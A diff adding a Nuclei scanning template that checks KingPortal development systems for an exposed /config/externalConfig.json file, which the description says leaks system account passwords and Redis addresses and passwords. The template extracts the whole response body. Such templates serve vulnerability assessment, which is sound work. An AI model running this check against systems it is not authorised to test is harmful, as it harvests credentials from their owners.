@@ -1,0 +1,27 @@
+id: KingPortal-leaks-ConfigManager
+
+info:
+  name: KingPortal开发系统-信息泄露
+  author: ghosinshell
+  severity: Medium
+  description: KingPortal开发系统-信息泄露（系统账号密码、Redis地址密码）
+  tags: KingPortal开发系统, KingPortal, 数据库信息泄漏
+  reference: https://github.com/ghosinshell/Nuclei-POC
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/config/externalConfig.json"
+
+    matchers:
+      - type: word
+        words:
+          - "expose"
+          - "oauthClient"
+          - "redirectUrl"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(.*)"
